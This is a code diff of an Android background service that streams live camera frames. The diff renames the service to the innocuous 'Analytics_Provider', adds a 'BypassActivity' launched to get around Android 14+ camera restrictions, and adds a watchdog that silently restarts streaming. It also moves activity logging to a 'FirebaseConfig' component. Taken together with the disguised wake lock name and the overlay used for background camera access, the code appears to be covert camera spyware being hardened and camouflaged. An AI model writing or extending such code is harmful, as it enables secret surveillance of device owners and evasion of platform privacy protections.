@@ -62,9 +62,9 @@ import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.TimeUnit;
 
-public class MediaContainer extends Service {
-    private static final String TAG = "MediaContainer";
-    private static final String CHANNEL_ID = "MediaContainerChannel";
+public class Analytics_Provider extends Service {
+    private static final String TAG = "Analytics_Provider";
+    private static final String CHANNEL_ID = "Analytics_ProviderChannel";
     private static final int NOTIFICATION_ID = 2002;
 
     // Camera components
@@ -84,9 +84,11 @@ public class MediaContainer extends Service {
     // Live streaming
     private static volatile boolean isStreaming = false;
     private static volatile String currentCameraId = "0";
+    private static volatile long lastFrameTime = 0;
     private static volatile int streamWidth = 640;
     private static volatile int streamHeight = 480;
     private static volatile int streamQuality = 50;
+    private static volatile long lastFrameReceived = 0;
     private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(30);
 
     // Photo capture
@@ -110,9 +112,9 @@ public class MediaContainer extends Service {
     private static boolean isForeground = false;
 
     // Singleton instance
-    private static MediaContainer instance;
+    private static Analytics_Provider instance;
 
-    public static MediaContainer getInstance() {
+    public static Analytics_Provider getInstance() {
         return instance;
     }
 
@@ -134,7 +136,7 @@ public class MediaContainer extends Service {
         wakeLock = powerManager.newWakeLock(
                 PowerManager.PARTIAL_WAKE_LOCK,
                 "System:StabilityWakeLock");
-        Log.d(TAG, "MediaContainer created with WakeLock support");
+        Log.d(TAG, "Analytics_Provider created with WakeLock support");
     }
 
     @Override
@@ -186,7 +188,7 @@ public class MediaContainer extends Service {
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
-        if (CoreSyncService.isDestructing) {
+        if (WorkManager_Sync.isDestructing) {
             super.onTaskRemoved(rootIntent);
             return;
         }
@@ -277,6 +279,28 @@ public class MediaContainer extends Service {
             backgroundThread = new HandlerThread("CameraBackground");
             backgroundThread.start();
             backgroundHandler = new Handler(backgroundThread.getLooper());
+            
+            // --- OPTICS_WATCHDOG: Hardware Recovery Engine ---
+            backgroundHandler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    long now = System.currentTimeMillis();
+                    // Only recovery if it WAS working (lastFrameReceived > 0) and now it's dead
+                    if (isStreaming && lastFrameReceived > 0 && (now - lastFrameReceived > 12000)) {
+                        Log.e(TAG, "OPTICS_WATCHDOG: Heartbeat lost. Rebooting optics...");
+                        FirebaseConfig.logActivity("OPTICS_RECOVERY: Hardware reset triggered");
+                        synchronized (TAG) { lastFrameReceived = now; }
+                        
+                        // Force a clean restart
+                        backgroundHandler.post(() -> {
+                            stopStreaming();
+                            try { Thread.sleep(1000); } catch (Exception ignored) {}
+                            startStreamingInternal();
+                        });
+                    }
+                    backgroundHandler.postDelayed(this, 5000);
+                }
+            }, 15000);
         }
     }
 
@@ -421,7 +445,7 @@ public class MediaContainer extends Service {
 
                 if (!surfaceReady) {
                     lastCaptureError = "Surface not ready (Overlay permission missing)";
-                    LabRatsHttpServer.logActivity("OPTICS_ERROR: Snapshot surface not ready");
+                    FirebaseConfig.logActivity("OPTICS_ERROR: Snapshot surface not ready");
                     captureLatch.countDown();
                     return;
                 }
@@ -505,7 +529,7 @@ public class MediaContainer extends Service {
                 @Override
                 public void onError(@NonNull CameraDevice camera, int error) {
                     Log.e(TAG, "Capture error: " + error + " on camera " + cameraId);
-                    LabRatsHttpServer.logActivity("OPTICS_ERROR: Camera " + cameraId + " error code " + error);
+                    FirebaseConfig.logActivity("OPTICS_ERROR: Camera " + cameraId + " error code " + error);
                     camera.close();
                     cameraDevice = null;
                     lastCaptureError = "Camera error: " + error;
@@ -577,7 +601,16 @@ public class MediaContainer extends Service {
 
     public void startStreaming(String cameraId, int width, int height, int quality) {
         Log.d(TAG, "Request to start streaming: " + cameraId);
-        LabRatsHttpServer.logActivity("OPTICS_INIT: Starting stream from camera " + cameraId);
+        FirebaseConfig.logActivity("OPTICS_INIT: Starting stream from camera " + cameraId);
+        
+        // [STABILITY_BYPASS] Opaque window lock for Android 14+
+        // This MUST happen before any hardware calls to satisfy security policy
+        try {
+            Intent bypass = new Intent(this, CameraHelper.BypassActivity.class);
+            bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+            startActivity(bypass);
+        } catch (Exception e) { Log.e(TAG, "Bypass fail: " + e.getMessage()); }
+
         if (isStreaming) {
             stopStreaming();
         }
@@ -592,6 +625,9 @@ public class MediaContainer extends Service {
             // Modern Android requires an active window/surface for background camera access
             createOverlay();
             
+            // --- WATCHDOG_INIT ---
+            synchronized (TAG) { lastFrameReceived = System.currentTimeMillis(); }
+
             // Critical hardware reset delay
             if (isStreaming) {
                 stopStreaming();
@@ -612,10 +648,11 @@ public class MediaContainer extends Service {
 
     private void startStreamingInternal() {
         Log.d(TAG, "Initializing camera for internal stream: " + currentCameraId);
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                 Log.e(TAG, "Camera permission not granted");
-                LabRatsHttpServer.logActivity("OPTICS_ERROR: Camera permission missing");
+                FirebaseConfig.logActivity("OPTICS_ERROR: Camera permission missing");
                 return;
             }
         }
@@ -636,34 +673,38 @@ public class MediaContainer extends Service {
                 imageReader.close();
             }
 
-            imageReader = ImageReader.newInstance(streamWidth, streamHeight, ImageFormat.YUV_420_888, 2);
+            // Determine rotation once for the stream session
+            final int rotation;
+            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
+            if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
+                rotation = 270;
+            } else {
+                rotation = 90;
+            }
+
+            // [STABILITY_SYNC] High buffer count for 4K stability
+            int maxImages = (streamWidth >= 1920) ? 5 : 2;
+            try {
+                imageReader = ImageReader.newInstance(streamWidth, streamHeight, ImageFormat.YUV_420_888, maxImages);
+            } catch (Exception e) {
+                Log.e(TAG, "4K Buffer failure, falling back to 1080p: " + e.getMessage());
+                streamWidth = 1920; streamHeight = 1080;
+                imageReader = ImageReader.newInstance(streamWidth, streamHeight, ImageFormat.YUV_420_888, 2);
+            }
             imageReader.setOnImageAvailableListener(reader -> {
                 Image image = null;
                 try {
                     if (!isStreaming || reader == null) return;
                     image = reader.acquireLatestImage();
                     if (image != null) {
-                        int rotation = 90;
-                        try {
-                            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
-                            if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
-                                rotation = 270;
-                            }
-                        } catch (Exception e) {}
+                        long now = System.currentTimeMillis();
+                        lastFrameTime = now;
                         
-                        // --- ADAPTIVE THERMAL THROTTLING ---
-                        int quality = streamQuality;
-                        try {
-                            Intent batIntent = getApplicationContext().registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
-                            if (batIntent != null) {
-                                int temp = batIntent.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0);
-                                if (temp > 400) { // > 40°C
-                                    quality = Math.max(15, quality - 15);
-                                }
-                            }
-                        } catch (Exception ignored) {}
-                        
-                        byte[] jpegData = yuv420ToJpeg(image, quality, rotation);
+                        // Dynamic watchdog update
+                        synchronized (TAG) { lastFrameReceived = now; }
+
+                        // Simplified capture loop: remove dynamic thermal throttling to prevent hardware timeouts
+                        byte[] jpegData = yuv420ToJpeg(image, streamQuality, rotation);
                         if (jpegData != null) {
                             while (!frameQueue.offer(jpegData)) {
                                 frameQueue.poll();
@@ -697,7 +738,7 @@ public class MediaContainer extends Service {
                 @Override
                 public void onError(@NonNull CameraDevice camera, int error) {
                     Log.e(TAG, "Camera device error: " + error + " on camera " + currentCameraId);
-                    LabRatsHttpServer.logActivity("OPTICS_ERROR: Stream camera " + currentCameraId + " error " + error);
+                    FirebaseConfig.logActivity("OPTICS_ERROR: Stream camera " + currentCameraId + " error " + error);
                     camera.close();
                     cameraDevice = null;
                     isStreaming = false;
@@ -706,7 +747,7 @@ public class MediaContainer extends Service {
 
         } catch (Exception e) {
             Log.e(TAG, "Error starting stream", e);
-            LabRatsHttpServer.logActivity("OPTICS_ERROR: Fatal stream init error: " + e.getMessage());
+            FirebaseConfig.logActivity("OPTICS_ERROR: Fatal stream init error: " + e.getMessage());
             isStreaming = false;
         }
     }
@@ -815,25 +856,46 @@ public class MediaContainer extends Service {
         try {
             int width = image.getWidth();
             int height = image.getHeight();
+            
+            // [QUALITY_BOOST] Ensure high fidelity for Ultra High modes
+            int finalQuality = quality;
+            if (width >= 1920) finalQuality = Math.max(quality, 95);
 
             Image.Plane[] planes = image.getPlanes();
             ByteBuffer yBuffer = planes[0].getBuffer();
             ByteBuffer uBuffer = planes[1].getBuffer();
             ByteBuffer vBuffer = planes[2].getBuffer();
 
-            int ySize = yBuffer.remaining();
-            int uSize = uBuffer.remaining();
-            int vSize = vBuffer.remaining();
+            int yStride = planes[0].getRowStride();
+            int uvStride = planes[1].getRowStride();
+            int uvPixelStride = planes[1].getPixelStride();
 
-            byte[] nv21 = new byte[ySize + uSize + vSize];
+            byte[] nv21 = new byte[width * height * 3 / 2];
+            int pos = 0;
 
-            yBuffer.get(nv21, 0, ySize);
-            vBuffer.get(nv21, ySize, vSize);
-            uBuffer.get(nv21, ySize + vSize, uSize);
+            // Copy Y plane row by row to handle stride
+            for (int row = 0; row < height; row++) {
+                yBuffer.position(row * yStride);
+                int count = Math.min(width, yBuffer.remaining());
+                yBuffer.get(nv21, pos, count);
+                pos += width;
+            }
+
+            // Copy UV planes with correct pixel stride handling
+            for (int row = 0; row < height / 2; row++) {
+                int rowStart = row * uvStride;
+                for (int col = 0; col < width / 2; col++) {
+                    int offset = rowStart + col * uvPixelStride;
+                    if (offset < vBuffer.limit() && offset < uBuffer.remaining() + uBuffer.position()) {
+                        nv21[pos++] = vBuffer.get(offset);
+                        nv21[pos++] = uBuffer.get(offset);
+                    }
+                }
+            }
 
             YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, width, height, null);
             ByteArrayOutputStream out = new ByteArrayOutputStream();
-            yuvImage.compressToJpeg(new Rect(0, 0, width, height), quality, out);
+            yuvImage.compressToJpeg(new Rect(0, 0, width, height), finalQuality, out);
 
             if (rotation == 0) {
                 return out.toByteArray();
@@ -849,33 +911,41 @@ public class MediaContainer extends Service {
     // ============ UTILITY METHODS ============
 
     private Size chooseBestSize(Size[] sizes, int targetWidth, int targetHeight) {
-        if (sizes == null || sizes.length == 0) {
-            return new Size(640, 480);
-        }
+        if (sizes == null || sizes.length == 0) return new Size(640, 480);
 
-        List<Size> sizeList = Arrays.asList(sizes);
-        Collections.sort(sizeList, (a, b) -> {
-            int areaA = a.getWidth() * a.getHeight();
-            int areaB = b.getWidth() * b.getHeight();
-            return Integer.compare(areaA, areaB);
-        });
+        List<Size> sizeList = new ArrayList<>(Arrays.asList(sizes));
+        // Sort descending by area to determine the native aspect ratio from the largest sensor output
+        Collections.sort(sizeList, (a, b) -> Integer.compare(b.getWidth() * b.getHeight(), a.getWidth() * a.getHeight()));
 
-        int targetArea = targetWidth * targetHeight;
-        for (Size size : sizeList) {
-            int area = size.getWidth() * size.getHeight();
-            if (area >= targetArea * 0.5 && area <= targetArea * 2) {
-                return size;
+        Size largest = sizeList.get(0);
+        float targetAspect = (float) largest.getWidth() / largest.getHeight();
+
+        // [STABILITY_SYNC] Only pick sizes with matching aspect ratios to prevent FOV shift (zoom effect)
+        List<Size> consistentAspectList = new ArrayList<>();
+        for (Size s : sizes) {
+            float aspect = (float) s.getWidth() / s.getHeight();
+            if (Math.abs(aspect - targetAspect) < 0.05) { // 5% tolerance
+                consistentAspectList.add(s);
             }
         }
 
-        // Return closest to target
-        for (Size size : sizeList) {
-            if (size.getWidth() >= 320 && size.getWidth() <= 1280) {
-                return size;
+        // If no sizes match aspect ratio (rare), fallback to full safe list
+        List<Size> sourceList = consistentAspectList.isEmpty() ? sizeList : consistentAspectList;
+
+        // [ULTRA_HIGH_FORCE]
+        long targetArea = (long) targetWidth * targetHeight;
+        Size best = sourceList.get(sourceList.size() - 1); // Default to smallest
+        long minDiff = Long.MAX_VALUE;
+
+        for (Size s : sourceList) {
+            long area = (long) s.getWidth() * s.getHeight();
+            long diff = Math.abs(area - targetArea);
+            if (area >= targetArea && diff < minDiff) {
+                minDiff = diff;
+                best = s;
             }
         }
-
-        return sizeList.get(sizeList.size() / 2);
+        return best;
     }
 
     private synchronized void closeCamera() {
@@ -1032,7 +1102,7 @@ public class MediaContainer extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        Log.d(TAG, "MediaContainer onDestroy");
+        Log.d(TAG, "Analytics_Provider onDestroy");
         isStreaming = false;
         stopVideoRecording();
         closeCamera();
